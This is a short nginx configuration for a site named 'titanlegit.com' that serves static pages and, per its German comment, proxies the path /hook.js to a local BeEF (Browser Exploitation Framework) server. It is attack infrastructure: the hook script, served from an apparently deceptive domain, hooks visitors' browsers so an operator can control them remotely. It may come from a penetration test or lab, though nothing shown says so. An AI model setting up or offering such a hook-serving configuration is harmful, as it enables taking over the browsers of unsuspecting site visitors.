server {
    listen 80;
    server_name titanlegit.com www.titanlegit.com;

    # Proxy für BeEF-Hook
    location /hook.js {
        proxy_pass http://127.0.0.1:3000/hook.js;
    }

    location / {
        root /var/www/html;
        index index.html;
        try_files $uri $uri/ =404;
    }
}
